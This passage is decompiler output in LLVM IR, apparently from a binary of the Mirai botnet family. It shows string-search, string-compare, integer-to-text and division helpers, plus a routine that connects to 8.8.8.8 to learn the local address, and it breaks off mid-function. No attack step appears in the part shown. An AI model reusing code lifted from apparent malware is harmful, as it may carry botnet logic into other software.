  %v3_10e78 = call i32 @__libc_connect(i32 %v3_10e38, i32 %v2_10e58, i32 %v0_10e64)
  store i32 %v2_10e58, i32* @r1, align 4
  %v2_10e80 = ptrtoint i32* %stack_var_-20 to i32
  %v0_10e84 = load i32, i32* @r5, align 4
  %v3_10e88 = call i32 @__GI_getsockname(i32 %v0_10e84, i32 %v2_10e58, i32 %v2_10e80)
  %v0_10e8c = load i32, i32* @r5, align 4
  %v1_10e90 = call i32 @__GI___libc_close(i32 %v0_10e8c)
  br label %dec_label_pc_10e98

dec_label_pc_10e98:                               ; preds = %bb, %dec_label_pc_10e4c
  %storemerge = phi i32 [ 134744072, %dec_label_pc_10e4c ], [ %v1_10e44, %bb ]
  store i32 %v3_10e10, i32* @r4, align 4
  store i32 %v6_10e10, i32* @r5, align 4
  store i32 %v9_10e10, i32* @r6, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_10e58, { 1, 0, 2, 3 }
  uselistorder i32 %v3_10e38, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 7, 9, 1, 8, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 24, 26, 23, 4, 25, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 0, 10, 9, 8, 7, 6, 5, 1, 3, 2 }
  uselistorder i32 ()* @__GI___errno_location, { 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_10e98, { 1, 0 }
}

define i32 @util_stristr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp23 = ptrtoint i8* %arg1 to i32
  %v3_10ea8 = load i8, i8* %tmp, align 1
  %v4_10ea8 = zext i8 %v3_10ea8 to i32
  store i32 %v4_10ea8, i32* @r3, align 4
  %v2_10eac = icmp eq i8 %v3_10ea8, 0
  br i1 %v2_10eac, label %bb, label %dec_label_pc_10ec0

bb:                                               ; preds = %entry
  br label %dec_label_pc_10ed4

dec_label_pc_10ec0:                               ; preds = %entry
  br label %dec_label_pc_10ec4

dec_label_pc_10ec4:                               ; preds = %dec_label_pc_10ec4, %dec_label_pc_10ec0
  %v0_10ec4 = phi i32 [ %v1_10ec4, %dec_label_pc_10ec4 ], [ 0, %dec_label_pc_10ec0 ]
  %v1_10ec4 = add i32 %v0_10ec4, 1
  %v2_10ec8 = add i32 %v1_10ec4, %arg2
  %v3_10ec8 = inttoptr i32 %v2_10ec8 to i8*
  %v4_10ec8 = load i8, i8* %v3_10ec8, align 1
  %v6_10ec8 = zext i8 %v4_10ec8 to i32
  store i32 %v6_10ec8, i32* @r3, align 4
  %v2_10ecc = icmp eq i8 %v4_10ec8, 0
  br i1 %v2_10ecc, label %dec_label_pc_10ed4, label %dec_label_pc_10ec4

dec_label_pc_10ed4:                               ; preds = %dec_label_pc_10ec4, %bb
  %v0_10f1821 = phi i32 [ %v4_10ea8, %bb ], [ %v1_10ec4, %dec_label_pc_10ec4 ]
  %v0_10edc2 = load i32, i32* @r1, align 4
  %tmp29 = icmp slt i32 %v0_10edc2, 1
  br i1 %tmp29, label %dec_label_pc_10f2c, label %dec_label_pc_10ee8

dec_label_pc_10ee8:                               ; preds = %dec_label_pc_10ed4, %dec_label_pc_10edc.backedge
  %v0_10ee0.in = phi i32 [ %v0_10ee0, %dec_label_pc_10edc.backedge ], [ %v0_10edc2, %dec_label_pc_10ed4 ]
  %v1_10ef4 = phi i32 [ %v1_10ef415, %dec_label_pc_10edc.backedge ], [ 0, %dec_label_pc_10ed4 ]
  %v0_10ee8 = phi i32 [ %v5_10ee8, %dec_label_pc_10edc.backedge ], [ %tmp23, %dec_label_pc_10ed4 ]
  %v0_10ee0 = add i32 %v0_10ee0.in, -1
  %v1_10ee8 = inttoptr i32 %v0_10ee8 to i8*
  %v2_10ee8 = load i8, i8* %v1_10ee8, align 1
  %v3_10ee8 = zext i8 %v2_10ee8 to i32
  %v5_10ee8 = add i32 %v0_10ee8, 1
  %v1_10eec = add nsw i32 %v3_10ee8, -65
  %v2_10ef4 = add i32 %v1_10ef4, %arg2
  %v3_10ef4 = inttoptr i32 %v2_10ef4 to i8*
  %v4_10ef4 = load i8, i8* %v3_10ef4, align 1
  %v6_10ef4 = zext i8 %v4_10ef4 to i32
  store i32 %v6_10ef4, i32* @r3, align 4
  %v1_10ef8 = add nsw i32 %v6_10ef4, -65
  %tmp38 = icmp ult i32 %v1_10eec, 26
  br i1 %tmp38, label %bb30, label %bb31

bb30:                                             ; preds = %dec_label_pc_10ee8
  %v5_10efc = or i32 %v3_10ee8, 96
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_10ee8, %bb30
  %v0_10f08 = phi i32 [ %v3_10ee8, %dec_label_pc_10ee8 ], [ %v5_10efc, %bb30 ]
  %tmp39 = icmp ult i32 %v1_10ef8, 26
  br i1 %tmp39, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  %v5_10f04 = or i32 %v6_10ef4, 96
  store i32 %v5_10f04, i32* @r3, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_10f08 = phi i32 [ %v6_10ef4, %bb31 ], [ %v5_10f04, %bb32 ]
  %v9_10f08 = icmp eq i32 %v0_10f08, %v1_10f08
  br i1 %v9_10f08, label %dec_label_pc_10f14, label %bb34

bb34:                                             ; preds = %bb33
  br label %dec_label_pc_10edc.backedge

dec_label_pc_10edc.backedge:                      ; preds = %bb34, %dec_label_pc_10f14
  %v1_10ef415 = phi i32 [ 0, %bb34 ], [ %v1_10f14, %dec_label_pc_10f14 ]
  %tmp35 = icmp slt i32 %v0_10ee0, 1
  br i1 %tmp35, label %dec_label_pc_10f2c, label %dec_label_pc_10ee8

dec_label_pc_10f14:                               ; preds = %bb33
  %v1_10f14 = add i32 %v1_10ef4, 1
  %v9_10f18 = icmp eq i32 %v0_10f1821, %v1_10f14
  br i1 %v9_10f18, label %dec_label_pc_10f20, label %dec_label_pc_10edc.backedge

dec_label_pc_10f20:                               ; preds = %dec_label_pc_10f14
  %v2_10f20 = sub i32 %v5_10ee8, %tmp23
  br label %dec_label_pc_10f2c

dec_label_pc_10f2c:                               ; preds = %dec_label_pc_10edc.backedge, %dec_label_pc_10ed4, %dec_label_pc_10f20
  %storemerge = phi i32 [ %v2_10f20, %dec_label_pc_10f20 ], [ -1, %dec_label_pc_10ed4 ], [ -1, %dec_label_pc_10edc.backedge ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_10f14, { 1, 0 }
  uselistorder i32 %v0_10ee8, { 1, 0 }
  uselistorder i32 %v1_10ef4, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32 26, { 0, 1, 5, 2, 6, 3, 7, 4, 8 }
  uselistorder label %dec_label_pc_10f2c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10edc.backedge, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_10ee8, { 1, 0 }
}

define i32 @util_strcmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_10f34 = load i8, i8* %arg1, align 1
  %v2_10f38 = icmp eq i8 %v2_10f34, 0
  br i1 %v2_10f38, label %bb, label %dec_label_pc_10f44

bb:                                               ; preds = %entry
  %v3_10f34 = zext i8 %v2_10f34 to i32
  br label %dec_label_pc_10f58

dec_label_pc_10f44:                               ; preds = %entry
  br label %dec_label_pc_10f48

dec_label_pc_10f48:                               ; preds = %dec_label_pc_10f48, %dec_label_pc_10f44
  %v0_10f48 = phi i32 [ %v1_10f48, %dec_label_pc_10f48 ], [ 0, %dec_label_pc_10f44 ]
  %v1_10f48 = add i32 %v0_10f48, 1
  %v2_10f4c = add i32 %v1_10f48, %tmp
  %v3_10f4c = inttoptr i32 %v2_10f4c to i8*
  %v4_10f4c = load i8, i8* %v3_10f4c, align 1
  %v2_10f50 = icmp eq i8 %v4_10f4c, 0
  br i1 %v2_10f50, label %dec_label_pc_10f58, label %dec_label_pc_10f48

dec_label_pc_10f58:                               ; preds = %dec_label_pc_10f48, %bb
  %v0_10fa43 = phi i32 [ %v3_10f34, %bb ], [ %v1_10f48, %dec_label_pc_10f48 ]
  %v1_10f58 = inttoptr i32 %arg2 to i8*
  %v2_10f58 = load i8, i8* %v1_10f58, align 1
  %v3_10f58 = zext i8 %v2_10f58 to i32
  store i32 %v3_10f58, i32* @r3, align 4
  %v2_10f5c = icmp eq i8 %v2_10f58, 0
  br i1 %v2_10f5c, label %bb21, label %dec_label_pc_10f68

bb21:                                             ; preds = %dec_label_pc_10f58
  store i32 %v3_10f58, i32* @r2, align 4
  br label %dec_label_pc_10f7c

dec_label_pc_10f68:                               ; preds = %dec_label_pc_10f58
  br label %dec_label_pc_10f6c

dec_label_pc_10f6c:                               ; preds = %dec_label_pc_10f6c, %dec_label_pc_10f68
  %v0_10f6c = phi i32 [ %v1_10f6c, %dec_label_pc_10f6c ], [ 0, %dec_label_pc_10f68 ]
  %v1_10f6c = add i32 %v0_10f6c, 1
  store i32 %v1_10f6c, i32* @r2, align 4
  %v2_10f70 = add i32 %v1_10f6c, %arg2
  %v3_10f70 = inttoptr i32 %v2_10f70 to i8*
  %v4_10f70 = load i8, i8* %v3_10f70, align 1
  %v6_10f70 = zext i8 %v4_10f70 to i32
  store i32 %v6_10f70, i32* @r3, align 4
  %v2_10f74 = icmp eq i8 %v4_10f70, 0
  br i1 %v2_10f74, label %dec_label_pc_10f7c, label %dec_label_pc_10f6c

dec_label_pc_10f7c:                               ; preds = %dec_label_pc_10f6c, %bb21
  %v0_10f7c = phi i32 [ %v3_10f58, %bb21 ], [ %v1_10f6c, %dec_label_pc_10f6c ]
  %v9_10f7c = icmp eq i32 %v0_10f7c, %v0_10fa43
  br i1 %v9_10f7c, label %dec_label_pc_10fa4.preheader, label %dec_label_pc_10f84

dec_label_pc_10fa4.preheader:                     ; preds = %dec_label_pc_10f7c
  %v2_10fa45 = icmp eq i32 %v0_10fa43, 0
  br i1 %v2_10fa45, label %dec_label_pc_10fac, label %dec_label_pc_10f8c

dec_label_pc_10f84:                               ; preds = %dec_label_pc_10f8c, %dec_label_pc_10f7c
  ret i32 0

dec_label_pc_10f8c:                               ; preds = %dec_label_pc_10f9c, %dec_label_pc_10fa4.preheader
  %v0_10fa4.in = phi i32 [ %v0_10fa4, %dec_label_pc_10f9c ], [ %v0_10fa43, %dec_label_pc_10fa4.preheader ]
  %v0_10fa0 = phi i32 [ %v1_10fa0, %dec_label_pc_10f9c ], [ %arg2, %dec_label_pc_10fa4.preheader ]
  %v0_10f9c = phi i32 [ %v1_10f9c, %dec_label_pc_10f9c ], [ %tmp, %dec_label_pc_10fa4.preheader ]
  %v0_10fa4 = add i32 %v0_10fa4.in, -1
  %v1_10f8c = inttoptr i32 %v0_10f9c to i8*
  %v2_10f8c = load i8, i8* %v1_10f8c, align 1
  %v3_10f8c = zext i8 %v2_10f8c to i32
  store i32 %v3_10f8c, i32* @r2, align 4
  %v1_10f90 = inttoptr i32 %v0_10fa0 to i8*
  %v2_10f90 = load i8, i8* %v1_10f90, align 1
  %v3_10f90 = zext i8 %v2_10f90 to i32
  store i32 %v3_10f90, i32* @r3, align 4
  %v9_10f94 = icmp eq i8 %v2_10f8c, %v2_10f90
  br i1 %v9_10f94, label %dec_label_pc_10f9c, label %dec_label_pc_10f84

dec_label_pc_10f9c:                               ; preds = %dec_label_pc_10f8c
  %v1_10f9c = add i32 %v0_10f9c, 1
  %v1_10fa0 = add i32 %v0_10fa0, 1
  %v2_10fa4 = icmp eq i32 %v0_10fa4, 0
  br i1 %v2_10fa4, label %dec_label_pc_10fac, label %dec_label_pc_10f8c

dec_label_pc_10fac:                               ; preds = %dec_label_pc_10f9c, %dec_label_pc_10fa4.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_10f6c, { 0, 1, 3, 2 }
  uselistorder i8 %v2_10f34, { 1, 0 }
}

define i32 @util_itoa(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-66 = alloca i32, align 4
  %v0_10fb8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_10fb8, i32* %r8.global-to-local, align 4
  %v2_10fb8 = icmp eq i32 %v0_10fb8, 0
  store i1 %v2_10fb8, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_10fb8, label %dec_label_pc_11098, label %dec_label_pc_10fc8

dec_label_pc_10fc8:                               ; preds = %entry
  %v3_10fc8 = icmp eq i8 %arg1, 0
  store i1 %v3_10fc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10fc8, label %.thread, label %dec_label_pc_10fdc

.thread:                                          ; preds = %dec_label_pc_10fc8
  %v4_10fd0 = inttoptr i32 %v0_10fb8 to i8*
  store i8 48, i8* %v4_10fd0, align 1
  %v0_10fd4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10fd4.pr.pr, label %.thread1, label %dec_label_pc_10fdc

.thread1:                                         ; preds = %.thread
  %v4_10fd4 = load i32, i32* %r8.global-to-local, align 4
  %v5_10fd4 = add i32 %v4_10fd4, 1
  %v6_10fd4 = inttoptr i32 %v5_10fd4 to i8*
  store i8 0, i8* %v6_10fd4, align 1
  %v0_10fd8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10fd8.pr.pr, label %dec_label_pc_11098, label %dec_label_pc_10fdc

dec_label_pc_10fdc:                               ; preds = %dec_label_pc_10fc8, %.thread, %.thread1
  %tmp48 = icmp slt i8 %arg1, 0
  %v7_10fe0 = icmp eq i32 %arg2, 10
  store i1 %v7_10fe0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fe0, label %bb, label %.thread29

.thread29:                                        ; preds = %dec_label_pc_10fdc
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread6

bb:                                               ; preds = %dec_label_pc_10fdc
  %v4_10fdc = zext i1 %tmp48 to i32
  store i32 %v4_10fdc, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp48, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  %v3_110008 = sub nsw i32 0, %tmp
  %tmp.v3_110008 = select i1 %phitmp, i32 %tmp, i32 %v3_110008
  %tmp47 = zext i1 %phitmp to i32
  %. = xor i32 %tmp47, 1
  br label %.thread6

.thread6:                                         ; preds = %bb, %.thread29
  %storemerge31 = phi i32 [ %tmp, %.thread29 ], [ %tmp.v3_110008, %bb ]
  %storemerge = phi i32 [ 0, %.thread29 ], [ %., %bb ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r5.global-to-local, align 4
  %v2_1100c = ptrtoint i32* %stack_var_-66 to i32
  store i32 %v2_1100c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11010

dec_label_pc_11010:                               ; preds = %bb46, %.thread6
  %v2_11030 = phi i32 [ %v1_1103c, %bb46 ], [ 32, %.thread6 ]
  %v0_11024 = phi i32 [ %v2_11034, %bb46 ], [ %storemerge31, %.thread6 ]
  %v0_11014 = load i32, i32* %r6.global-to-local, align 4
  %v3_11018 = urem i32 %v0_11024, %v0_11014
  store i32 %v3_11018, i32* %r1.global-to-local, align 4
  %v7_1101c = icmp eq i32 %v3_11018, 9
  store i1 %v7_1101c, i1* %cpsr_z.global-to-local, align 1
  %v1_11020 = add i32 %v3_11018, 48
  store i32 %v0_11024, i32* %r0.global-to-local, align 4
  %v7_11028 = icmp sgt i32 %v3_11018, 9
  %extract.t = trunc i32 %v1_11020 to i8
  br i1 %v7_11028, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_11010
  %v9_11028 = add i32 %v3_11018, 55
  %extract.t28 = trunc i32 %v9_11028 to i8
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_11010, %bb45
  %v0_11030.off0 = phi i8 [ %extract.t, %dec_label_pc_11010 ], [ %extract.t28, %bb45 ]
  store i32 %v0_11014, i32* %r1.global-to-local, align 4
  %v3_11030 = load i32, i32* %r7.global-to-local, align 4
  %v4_11030 = add i32 %v3_11030, %v2_11030
  %v5_11030 = inttoptr i32 %v4_11030 to i8*
  store i8 %v0_11030.off0, i8* %v5_11030, align 1
  %v0_11034 = load i32, i32* %r0.global-to-local, align 4
  %v1_11034 = load i32, i32* %r1.global-to-local, align 4
  %v2_11034 = udiv i32 %v0_11034, %v1_11034
  store i32 %v2_11034, i32* %r0.global-to-local, align 4
  %v2_11038 = icmp ugt i32 %v1_11034, %v0_11034
  store i1 %v2_11038, i1* %cpsr_z.global-to-local, align 1
  %v0_1103c = load i32, i32* %r5.global-to-local, align 4
  %v1_1103c = add i32 %v0_1103c, -1
  store i32 %v1_1103c, i32* %r5.global-to-local, align 4
  br i1 %v2_11038, label %dec_label_pc_11044, label %dec_label_pc_11010

dec_label_pc_11044:                               ; preds = %bb46
  %v0_11044 = load i32, i32* %sl.global-to-local, align 4
  %v2_11044 = icmp eq i32 %v0_11044, 0
  store i1 %v2_11044, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11044, label %.thread12, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_11044
  %v3_11048 = ptrtoint i32* %stack_var_-32 to i32
  %v3_1104c = add i32 %v1_1103c, %v3_11048
  store i32 %v3_1104c, i32* %r2.global-to-local, align 4
  %v4_11054 = add i32 %v3_1104c, -34
  %v5_11054 = inttoptr i32 %v4_11054 to i8*
  store i8 45, i8* %v5_11054, align 1
  %v0_11058.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_11058.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v0_11058.pr.pr.pr, label %.thread12, label %.thread11._crit_edge

.thread12:                                        ; preds = %.thread11, %dec_label_pc_11044
  %v1_11058 = phi i32 [ %v1_1103c, %dec_label_pc_11044 ], [ %v1_11058.pre, %.thread11 ]
  %v2_11058 = add i32 %v1_11058, 1
  store i32 %v2_11058, i32* %r5.global-to-local, align 4
  br label %.thread11._crit_edge

.thread11._crit_edge:                             ; preds = %.thread11, %.thread12
  %v1_11064 = phi i32 [ %v2_11058, %.thread12 ], [ %v1_11058.pre, %.thread11 ]
  %v0_1105c = load i32, i32* %r7.global-to-local, align 4
  %v2_1105c = add i32 %v0_1105c, %v1_11064
  %v3_1105c = inttoptr i32 %v2_1105c to i8*
  %v4_1105c = load i8, i8* %v3_1105c, align 1
  %v6_1105c = zext i8 %v4_1105c to i32
  %v2_11060 = icmp eq i8 %v4_1105c, 0
  store i1 %v2_11060, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_1105c, i32* %r2.global-to-local, align 4
  br i1 %v2_11060, label %dec_label_pc_110a8, label %dec_label_pc_11070.preheader

dec_label_pc_11070.preheader:                     ; preds = %.thread11._crit_edge
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11070

dec_label_pc_11070:                               ; preds = %dec_label_pc_11070.preheader, %dec_label_pc_11070
  %v0_11070 = phi i32 [ 0, %dec_label_pc_11070.preheader ], [ %v1_11070, %dec_label_pc_11070 ]
  %v1_11070 = add i32 %v0_11070, 1
  store i32 %v1_11070, i32* %r1.global-to-local, align 4
  %v2_11074 = add i32 %v1_11070, %v2_1105c
  %v3_11074 = inttoptr i32 %v2_11074 to i8*
  %v4_11074 = load i8, i8* %v3_11074, align 1
  %v2_11078 = icmp eq i8 %v4_11074, 0
  store i1 %v2_11078, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11078, label %dec_label_pc_11080, label %dec_label_pc_11070

dec_label_pc_11080:                               ; preds = %dec_label_pc_11070, %dec_label_pc_110a8
  %v0_1108425 = phi i32 [ %v6_1105c, %dec_label_pc_110a8 ], [ %v1_11070, %dec_label_pc_11070 ]
  %v0_11080 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_11080, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11084

dec_label_pc_11084:                               ; preds = %dec_label_pc_11084.dec_label_pc_11084_crit_edge, %dec_label_pc_11080
  %v2_11090 = phi i32 [ %v5_11090, %dec_label_pc_11084.dec_label_pc_11084_crit_edge ], [ %v0_11080, %dec_label_pc_11080 ]
  %v0_11088 = phi i32 [ %v0_11088.pre, %dec_label_pc_11084.dec_label_pc_11084_crit_edge ], [ %v2_1105c, %dec_label_pc_11080 ]
  %v0_11084 = phi i32 [ %v0_11084.pre, %dec_label_pc_11084.dec_label_pc_11084_crit_edge ], [ %v0_1108425, %dec_label_pc_11080 ]
  %v1_11084 = add i32 %v0_11084, -1
  store i32 %v1_11084, i32* %r1.global-to-local, align 4
  %v1_11088 = inttoptr i32 %v0_11088 to i8*
  %v2_11088 = load i8, i8* %v1_11088, align 1
  %v5_11088 = add i32 %v0_11088, 1
  store i32 %v5_11088, i32* %r2.global-to-local, align 4
  %v3_1108c = icmp eq i32 %v0_11084, 0
  store i1 %v3_1108c, i1* %cpsr_z.global-to-local, align 1
  %v3_11090 = inttoptr i32 %v2_11090 to i8*
  store i8 %v2_11088, i8* %v3_11090, align 1
  %v4_11090 = load i32, i32* %r0.global-to-local, align 4
  %v5_11090 = add i32 %v4_11090, 1
  store i32 %v5_11090, i32* %r0.global-to-local, align 4
  br i1 %v3_1108c, label %dec_label_pc_11098, label %dec_label_pc_11084.dec_label_pc_11084_crit_edge

dec_label_pc_11084.dec_label_pc_11084_crit_edge:  ; preds = %dec_label_pc_11084
  %v0_11084.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_11088.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11084

dec_label_pc_11098:                               ; preds = %dec_label_pc_11084, %.thread1, %entry
  %v0_11098 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_11098, i32* %r0.global-to-local, align 4
  ret i32 %v0_11098

dec_label_pc_110a8:                               ; preds = %.thread11._crit_edge
  store i32 %v6_1105c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11080

; uselistorder directives
  uselistorder i32 %v5_11090, { 1, 0 }
  uselistorder i1 %v3_1108c, { 1, 0 }
  uselistorder i32 %v0_11088, { 1, 0 }
  uselistorder i32 %v1_11070, { 0, 1, 3, 2 }
  uselistorder i32 %v6_1105c, { 1, 0 }
  uselistorder i32 %v2_1105c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11058.pre, { 1, 0 }
  uselistorder i32 %v1_1103c, { 1, 0, 3, 2 }
  uselistorder i32 %v2_11034, { 1, 0 }
  uselistorder i32 %v3_11018, { 0, 2, 1, 3, 4 }
  uselistorder i1 %phitmp, { 2, 1, 0 }
  uselistorder i32 %v0_10fb8, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 1, 6, 7, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 11, 10, 12, 13 }
  uselistorder i32 55, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_11080, { 1, 0 }
  uselistorder label %dec_label_pc_11070, { 1, 0 }
  uselistorder label %.thread11._crit_edge, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_10fdc, { 2, 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_110b0 = load i32, i32* @r1, align 4
  %v1_110b0 = add i32 %v0_110b0, -1
  store i32 %v1_110b0, i32* %r2.global-to-local, align 4
  %v2_110b0 = icmp eq i32 %v0_110b0, 0
  %v7_110b0 = icmp eq i32 %v0_110b0, 1
  %v0_110b4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_110b0, i32 %v0_110b4)
  br i1 %v2_110b0, label %dec_label_pc_11198, label %dec_label_pc_110bc

dec_label_pc_110bc:                               ; preds = %entry
  %v0_110bc = load i32, i32* %r0.global-to-local, align 4
  %v1_110bc = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_110bc, %v1_110bc
  br i1 %tmp, label %dec_label_pc_110c4, label %dec_label_pc_11150

dec_label_pc_110c4:                               ; preds = %dec_label_pc_110bc
  %v1_110c4 = load i32, i32* %r2.global-to-local, align 4
  %v2_110c4 = and i32 %v1_110c4, %v1_110bc
  %v4_110c4 = icmp eq i32 %v2_110c4, 0
  br i1 %v4_110c4, label %dec_label_pc_1115c, label %dec_label_pc_110cc

dec_label_pc_110cc:                               ; preds = %dec_label_pc_110c4
  %v3_110cc = icmp ult i32 %v1_110bc, 536870912
  br i1 %v3_110cc, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_110cc
  %v4_110d0 = mul i32 %v1_110bc, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_110cc, %.thread
  %v0_110f0.pr36.ph = phi i32 [ %v4_110d0, %.thread ], [ %v1_110bc, %dec_label_pc_110cc ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_110cc ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_110f0.pr36 = phi i32 [ %v4_110e4, %bb81 ], [ %v0_110f0.pr36.ph, %.preheader.preheader ]
  %v1_110e8 = phi i32 [ %v4_110e8, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_110dc = icmp ugt i32 %v0_110f0.pr36, 268435455
  br i1 %v2_110dc, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_110f0thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_110e0 = icmp ult i32 %v0_110f0.pr36, %v0_110bc
  br i1 %v4_110e0, label %bb80, label %dec_label_pc_110f0thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_110e4 = and i32 %v0_110f0.pr36, 268435456
  %v3_110e4 = icmp eq i32 %v2_110e4, 0
  %v4_110e4 = mul i32 %v0_110f0.pr36, 16
  br i1 %v3_110e4, label %bb81, label %dec_label_pc_110f0.loopexit

bb81:                                             ; preds = %bb80
  %v2_110e8 = and i32 %v1_110e8, 268435456
  %v3_110e8 = icmp eq i32 %v2_110e8, 0
  %v4_110e8 = mul i32 %v1_110e8, 16
  br i1 %v3_110e8, label %.preheader, label %dec_label_pc_110f0thread-pre-split.loopexit.loopexit

dec_label_pc_110f0thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_110fc48.ph = phi i32 [ %v1_110e8, %bb ], [ %v4_110e8, %bb81 ]
  %v0_110f0.pr38.ph = phi i32 [ %v0_110f0.pr36, %bb ], [ %v4_110e4, %bb81 ]
  br label %dec_label_pc_110f0thread-pre-split.loopexit

dec_label_pc_110f0thread-pre-split.loopexit:      ; preds = %dec_label_pc_110f0thread-pre-split.loopexit.loopexit, %.thread2
  %v1_110fc48 = phi i32 [ %v1_110e8, %.thread2 ], [ %v1_110fc48.ph, %dec_label_pc_110f0thread-pre-split.loopexit.loopexit ]
  %v0_110f0.pr38 = phi i32 [ %v0_110f0.pr36, %.thread2 ], [ %v0_110f0.pr38.ph, %dec_label_pc_110f0thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_110f0thread-pre-split

dec_label_pc_110f0thread-pre-split:               ; preds = %dec_label_pc_110f0thread-pre-split.loopexit, %bb83
  %v1_110fc46 = phi i32 [ %v1_110fc48, %dec_label_pc_110f0thread-pre-split.loopexit ], [ %v3_110fc, %bb83 ]
  %v0_110f0.pr = phi i32 [ %v0_110f0.pr38, %dec_label_pc_110f0thread-pre-split.loopexit ], [ %v3_110f8, %bb83 ]
  br label %dec_label_pc_110f0

dec_label_pc_110f0.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_110f0

dec_label_pc_110f0:                               ; preds = %dec_label_pc_110f0.loopexit, %dec_label_pc_110f0thread-pre-split
  %v1_110fc = phi i32 [ %v1_110fc46, %dec_label_pc_110f0thread-pre-split ], [ %v1_110e8, %dec_label_pc_110f0.loopexit ]
  %v1_110f8 = phi i32 [ %v0_110f0.pr, %dec_label_pc_110f0thread-pre-split ], [ %v4_110e4, %dec_label_pc_110f0.loopexit ]
  %v2_110f0 = icmp slt i32 %v1_110f8, 0
  br i1 %v2_110f0, label %dec_label_pc_11104, label %bb82

bb82:                                             ; preds = %dec_label_pc_110f0
  %v4_110f4 = icmp ult i32 %v1_110f8, %v0_110bc
  br i1 %v4_110f4, label %bb83, label %dec_label_pc_11104

bb83:                                             ; preds = %bb82
  %v3_110f8 = mul i32 %v1_110f8, 2
